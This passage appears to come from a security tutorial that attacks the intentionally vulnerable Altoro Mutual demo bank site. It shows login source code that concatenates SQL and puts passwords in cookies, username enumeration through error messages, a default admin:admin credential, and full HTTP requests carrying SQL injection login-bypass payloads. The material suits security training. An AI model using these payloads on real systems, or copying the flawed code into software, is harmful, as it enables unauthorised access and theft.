</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">ConfigurationManager</span><span class="o">.</span><span class="n">ConnectionStrings</span><span class="p">[</span><span class="s2">&#34;DBConnStr&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ConnectionString</span><span class="o">.</span><span class="n">Contains</span><span class="p">(</span><span class="s2">&#34;Microsoft.Jet.OLEDB.4.0&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="o">//</span> <span class="n">Hack</span> <span class="k">for</span> <span class="n">MS</span> <span class="n">Access</span> <span class="n">which</span> <span class="n">can</span> <span class="ow">not</span> <span class="n">terminate</span> <span class="n">a</span> <span class="n">string</span>
</span></span><span class="line"><span class="cl">          <span class="n">query1</span> <span class="o">=</span> <span class="n">Regex</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="n">query1</span><span class="p">,</span> <span class="s2">&#34;--.*&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">query2</span> <span class="o">=</span> <span class="n">Regex</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="n">query2</span><span class="p">,</span> <span class="s2">&#34;--.*&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">DataSet</span> <span class="n">ds</span> <span class="o">=</span> <span class="n">new</span> <span class="n">DataSet</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">OleDbDataAdapter</span> <span class="n">myLogin</span> <span class="o">=</span> <span class="n">new</span> <span class="n">OleDbDataAdapter</span><span class="p">(</span><span class="n">query1</span><span class="p">,</span> <span class="n">myConnection</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">myLogin</span><span class="o">.</span><span class="n">Fill</span><span class="p">(</span><span class="n">ds</span><span class="p">,</span> <span class="s2">&#34;user&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">ds</span><span class="o">.</span><span class="n">Tables</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">Rows</span><span class="o">.</span><span class="n">Count</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="n">OleDbDataAdapter</span> <span class="n">myFailed</span> <span class="o">=</span> <span class="n">new</span> <span class="n">OleDbDataAdapter</span><span class="p">(</span><span class="n">query2</span><span class="p">,</span> <span class="n">myConnection</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">              <span class="n">myFailed</span><span class="o">.</span><span class="n">Fill</span><span class="p">(</span><span class="n">ds</span><span class="p">,</span> <span class="s2">&#34;user&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ds</span><span class="o">.</span><span class="n">Tables</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">Rows</span><span class="o">.</span><span class="n">Count</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">             <span class="n">status</span> <span class="o">=</span> <span class="s2">&#34;We&#39;re sorry, but this username was not found in our system.  Please try again.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">status</span> <span class="o">=</span> <span class="s2">&#34;Your password appears to be invalid.  Please re-enter your password carefully.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="o">//</span><span class="n">Get</span> <span class="n">the</span> <span class="n">row</span> <span class="n">returned</span> <span class="n">by</span> <span class="n">the</span> <span class="n">query</span>
</span></span><span class="line"><span class="cl">                <span class="n">DataRow</span> <span class="n">myRow</span> <span class="o">=</span> <span class="n">ds</span><span class="o">.</span><span class="n">Tables</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">Rows</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="o">//</span><span class="n">Set</span> <span class="n">the</span> <span class="n">Session</span> <span class="n">variables</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">          <span class="n">Session</span><span class="p">[</span><span class="s2">&#34;userId&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">myRow</span><span class="p">[</span><span class="s2">&#34;userid&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="n">Session</span><span class="p">[</span><span class="s2">&#34;userName&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">myRow</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="n">Session</span><span class="p">[</span><span class="s2">&#34;firstName&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">myRow</span><span class="p">[</span><span class="s2">&#34;first_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="n">Session</span><span class="p">[</span><span class="s2">&#34;lastName&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">myRow</span><span class="p">[</span><span class="s2">&#34;last_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="n">Session</span><span class="p">[</span><span class="s2">&#34;authenticated&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="o">//</span><span class="n">Close</span> <span class="n">the</span> <span class="n">database</span> <span class="n">collection</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">          <span class="n">myConnection</span><span class="o">.</span><span class="n">Close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">          <span class="o">//</span><span class="n">Set</span> <span class="n">UserInfo</span> <span class="n">cookie</span>
</span></span><span class="line"><span class="cl">          <span class="n">DateTime</span> <span class="n">dtNow</span> <span class="o">=</span> <span class="n">DateTime</span><span class="o">.</span><span class="n">Now</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="n">TimeSpan</span> <span class="n">tsHour</span> <span class="o">=</span> <span class="n">new</span> <span class="n">TimeSpan</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">180</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">string</span> <span class="n">sCookieUser</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Base64Decoder</span><span class="p">(</span><span class="n">uName</span><span class="p">)</span><span class="o">.</span><span class="n">GetDecoded</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">          <span class="n">HttpCookie</span> <span class="n">UserInfo</span> <span class="o">=</span> <span class="n">Request</span><span class="o">.</span><span class="n">Cookies</span><span class="p">[</span><span class="s2">&#34;amUserInfo&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">((</span><span class="n">UserInfo</span> <span class="o">==</span> <span class="n">null</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">sCookieUser</span> <span class="o">!=</span> <span class="n">Session</span><span class="p">[</span><span class="s2">&#34;userName&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ToString</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="n">UserInfo</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HttpCookie</span><span class="p">(</span><span class="s2">&#34;amUserInfo&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">              <span class="n">UserInfo</span><span class="p">[</span><span class="s2">&#34;UserName&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Base64Encoder</span><span class="p">(</span><span class="n">uName</span><span class="p">)</span><span class="o">.</span><span class="n">GetEncoded</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">              <span class="n">UserInfo</span><span class="p">[</span><span class="s2">&#34;Password&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Base64Encoder</span><span class="p">(</span><span class="n">pWord</span><span class="p">)</span><span class="o">.</span><span class="n">GetEncoded</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">              <span class="n">UserInfo</span><span class="o">.</span><span class="n">Expires</span> <span class="o">=</span> <span class="n">dtNow</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">tsHour</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">              <span class="n">Response</span><span class="o">.</span><span class="n">Cookies</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">UserInfo</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="n">HttpCookie</span> <span class="n">UserId</span> <span class="o">=</span> <span class="n">Request</span><span class="o">.</span><span class="n">Cookies</span><span class="p">[</span><span class="s2">&#34;amUserId&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="n">UserId</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HttpCookie</span><span class="p">(</span><span class="s2">&#34;amUserId&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">UserId</span><span class="o">.</span><span class="n">Value</span> <span class="o">=</span> <span class="n">Session</span><span class="p">[</span><span class="s2">&#34;userId&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ToString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">          <span class="n">Response</span><span class="o">.</span><span class="n">Cookies</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">UserId</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">query1</span> <span class="o">=</span> <span class="s2">&#34;SELECT userid, approved, card_type,interest, limit FROM promo WHERE userid=&#34;</span> <span class="o">+</span> <span class="n">Session</span><span class="p">[</span><span class="s2">&#34;userId&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="n">OleDbDataAdapter</span> <span class="n">myApproval</span> <span class="o">=</span> <span class="n">new</span> <span class="n">OleDbDataAdapter</span><span class="p">(</span><span class="n">query1</span><span class="p">,</span> <span class="n">myConnection</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">myApproval</span><span class="o">.</span><span class="n">Fill</span><span class="p">(</span><span class="n">ds</span><span class="p">,</span> <span class="s2">&#34;promo&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">DataTable</span> <span class="n">myTable</span> <span class="o">=</span> <span class="n">ds</span><span class="o">.</span><span class="n">Tables</span><span class="p">[</span><span class="s2">&#34;promo&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="n">DataRow</span> <span class="n">curRow</span> <span class="o">=</span> <span class="n">myTable</span><span class="o">.</span><span class="n">Rows</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">Convert</span><span class="o">.</span><span class="n">ToBoolean</span><span class="p">(</span><span class="n">curRow</span><span class="p">[</span><span class="s2">&#34;approved&#34;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">HttpCookie</span> <span class="n">CreditOffer</span> <span class="o">=</span> <span class="n">Request</span><span class="o">.</span><span class="n">Cookies</span><span class="p">[</span><span class="s2">&#34;amCreditOffer&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="n">CreditOffer</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HttpCookie</span><span class="p">(</span><span class="s2">&#34;amCreditOffer&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">CreditOffer</span><span class="p">[</span><span class="s2">&#34;CardType&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">curRow</span><span class="p">[</span><span class="s2">&#34;card_type&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ToString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">CreditOffer</span><span class="p">[</span><span class="s2">&#34;Limit&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">curRow</span><span class="p">[</span><span class="s2">&#34;limit&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ToString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">CreditOffer</span><span class="p">[</span><span class="s2">&#34;Interest&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">curRow</span><span class="p">[</span><span class="s2">&#34;interest&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ToString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">Response</span><span class="o">.</span><span class="n">Cookies</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">CreditOffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">myConnection</span><span class="o">.</span><span class="n">Close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">protected</span> <span class="n">string</span> <span class="n">GetUserName</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">HttpCookie</span> <span class="n">UserInfo</span> <span class="o">=</span> <span class="n">Request</span><span class="o">.</span><span class="n">Cookies</span><span class="p">[</span><span class="s2">&#34;amUserInfo&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">Request</span><span class="o">.</span><span class="n">Params</span><span class="p">[</span><span class="s2">&#34;uid&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="k">return</span> <span class="n">Request</span><span class="o">.</span><span class="n">Params</span><span class="p">[</span><span class="s2">&#34;uid&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ToString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">UserInfo</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="k">return</span> <span class="n">new</span> <span class="n">Base64Decoder</span><span class="p">(</span><span class="n">UserInfo</span><span class="p">[</span><span class="s2">&#34;UserName&#34;</span><span class="p">])</span><span class="o">.</span><span class="n">GetDecoded</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="k">else</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#region Web Form Designer generated code</span>
</span></span><span class="line"><span class="cl">    <span class="n">override</span> <span class="n">protected</span> <span class="n">void</span> <span class="n">OnInit</span><span class="p">(</span><span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="o">//</span>
</span></span><span class="line"><span class="cl">      <span class="o">//</span> <span class="n">CODEGEN</span><span class="p">:</span> <span class="n">This</span> <span class="n">call</span> <span class="n">is</span> <span class="n">required</span> <span class="n">by</span> <span class="n">the</span> <span class="n">ASP</span><span class="o">.</span><span class="n">NET</span> <span class="n">Web</span> <span class="n">Form</span> <span class="n">Designer</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">      <span class="o">//</span>
</span></span><span class="line"><span class="cl">      <span class="n">InitializeComponent</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">base</span><span class="o">.</span><span class="n">OnInit</span><span class="p">(</span><span class="n">e</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">///</span> <span class="o">&lt;</span><span class="n">summary</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">///</span> <span class="n">Required</span> <span class="n">method</span> <span class="k">for</span> <span class="n">Designer</span> <span class="n">support</span> <span class="o">-</span> <span class="k">do</span> <span class="ow">not</span> <span class="n">modify</span>
</span></span><span class="line"><span class="cl">    <span class="o">///</span> <span class="n">the</span> <span class="n">contents</span> <span class="n">of</span> <span class="n">this</span> <span class="n">method</span> <span class="n">with</span> <span class="n">the</span> <span class="n">code</span> <span class="n">editor</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">    <span class="o">///</span> <span class="o">&lt;/</span><span class="n">summary</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="n">private</span> <span class="n">void</span> <span class="n">InitializeComponent</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#endregion</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="brute-force-vulnerability">Brute force vulnerability</h3>
<p>Before we investigate the code, let&rsquo;s have a look at a much common vulnerability. Go to <a href="http://demo.testfire.net/bank/login.aspx">http://demo.testfire.net/bank/login.aspx</a> and use a random user for the login process. You&rsquo;ll get:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Login Failed: We&#39;re sorry, but this username was not found in our system. Please try again.
</span></span></code></pre></td></tr></table>
</div>
</div><p>You could now easily <strong>bruteforce</strong> common usernames in order to login into the application. The same works with passwords too: <em>admin</em> seems to be a valid username. Try to bruteforce the password and you&rsquo;ll get:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Login Failed: Your password appears to be invalid. Please re-enter your password carefully.
</span></span></code></pre></td></tr></table>
</div>
</div><p><em>admin:admin</em> is a valid username/password combination.</p>
<h3 id="sql-injection-using-post-parameters">SQL injection using POST parameters</h3>
<p>Now let&rsquo;s have a closer look at the source code&hellip; Let&rsquo;s analyze the <em>!ValidateUser</em>function:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">protected string ValidateUser(String uName, String pWord)
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">      //Set default status to Success
</span></span><span class="line"><span class="cl">      string status = &#34;Success&#34;;
</span></span><span class="line"><span class="cl">      OleDbConnection myConnection = new OleDbConnection();
</span></span><span class="line"><span class="cl">      myConnection.ConnectionString = ConfigurationManager.ConnectionStrings[&#34;DBConnStr&#34;].ConnectionString;
</span></span><span class="line"><span class="cl">      myConnection.Open();
</span></span><span class="line"><span class="cl">      string query2 = &#34;SELECT * From users WHERE username = &#39;&#34; + uName + &#34;&#39;&#34;;
</span></span><span class="line"><span class="cl">      string query1 = query2 + &#34; AND password = &#39;&#34; + pWord + &#34;&#39;&#34;;
</span></span><span class="line"><span class="cl">      if (ConfigurationManager.ConnectionStrings[&#34;DBConnStr&#34;].ConnectionString.Contains(&#34;Microsoft.Jet.OLEDB.4.0&#34;))
</span></span><span class="line"><span class="cl">      {
</span></span><span class="line"><span class="cl">          // Hack for MS Access which can not terminate a string
</span></span><span class="line"><span class="cl">          query1 = Regex.Replace(query1, &#34;--.*&#34;, &#34;&#34;);
</span></span><span class="line"><span class="cl">          query2 = Regex.Replace(query2, &#34;--.*&#34;, &#34;&#34;);
</span></span><span class="line"><span class="cl">      }
</span></span><span class="line"><span class="cl">      ....
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see the <em>uName</em> parameter doesn&rsquo;t get sanitized, so you can easily run some <strong>SQL injection</strong>. Let&rsquo;s try that out. Using <a href="http://www.portswigger.net/burp/">Burpsuite</a> we&rsquo;ll tamper data sent to the web server and analyze the responses.</p>
<p>Here&rsquo;s the request:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-.html" data-lang=".html"><span class="line"><span class="cl">POST /bank/login.aspx HTTP/1.1
</span></span><span class="line"><span class="cl">Host: demo.testfire.net
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span><span class="line"><span class="cl">Accept-Language: en-us,en;q=0.5
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Proxy-Connection: keep-alive
</span></span><span class="line"><span class="cl">Referer: http://demo.testfire.net/bank/login.aspx
</span></span><span class="line"><span class="cl">Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="cl">Content-Length: 39
</span></span><span class="line"><span class="cl">uid=admin%27<span class="err">&amp;</span>passw=test<span class="err">&amp;</span>btnSubmit=Login
</span></span></code></pre></td></tr></table>
</div>
</div><p>As a response you&rsquo;ll get:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">An</span> <span class="n">Error</span> <span class="n">Has</span> <span class="n">Occurred</span>
</span></span><span class="line"><span class="cl"><span class="n">Summary</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">Syntax</span> <span class="n">error</span> <span class="p">(</span><span class="n">missing</span> <span class="n">operator</span><span class="p">)</span> <span class="ow">in</span> <span class="n">query</span> <span class="n">expression</span> <span class="s1">&#39;username = &#39;</span><span class="n">admin</span><span class="s1">&#39;&#39;</span> <span class="n">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;test&#39;&#39;.</span>
</span></span><span class="line"><span class="cl"><span class="n">Error</span> <span class="n">Message</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="o">.</span><span class="n">Data</span><span class="o">.</span><span class="n">OleDb</span><span class="o">.</span><span class="n">OleDbException</span><span class="p">:</span> <span class="n">Syntax</span> <span class="n">error</span> <span class="p">(</span><span class="n">missing</span> <span class="n">operator</span><span class="p">)</span> <span class="ow">in</span> <span class="n">query</span> <span class="n">expression</span> <span class="s1">&#39;username = &#39;</span><span class="n">admin</span><span class="s1">&#39;&#39;</span> <span class="n">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;test&#39;&#39;. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Authentication.ValidateUser(String uName, String pWord) in d:downloadsAltoroMutual_v6websitanklogin.aspx.cs:line 68 at Altoro.Authentication.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitanklogin.aspx.cs:line 33 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><em>Single quotes</em> are obvisouly not escaped so we could inject some SQL statements. Let&rsquo;s try some common ones likeÂ <strong>admin&rsquo; OR 1=1;-</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-.html" data-lang=".html"><span class="line"><span class="cl">POST /bank/login.aspx HTTP/1.1
</span></span><span class="line"><span class="cl">Host: demo.testfire.net
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span><span class="line"><span class="cl">Accept-Language: en-us,en;q=0.5
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Proxy-Connection: keep-alive
</span></span><span class="line"><span class="cl">Referer: http://demo.testfire.net/bank/login.aspx
</span></span><span class="line"><span class="cl">Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="cl">Content-Length: 47
</span></span><span class="line"><span class="cl">uid=admin&#39; OR 1=1;--<span class="err">&amp;</span>passw=test<span class="err">&amp;</span>btnSubmit=Login
</span></span></code></pre></td></tr></table>
</div>
</div><p>The result looks very promising! We were able to login without specifying any password. All you need is a valid username. The same vulnerability applies to theÂ <em>password</em> field as well. Following request will work too:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-.html" data-lang=".html"><span class="line"><span class="cl">POST /bank/login.aspx HTTP/1.1
</span></span><span class="line"><span class="cl">Host: demo.testfire.net
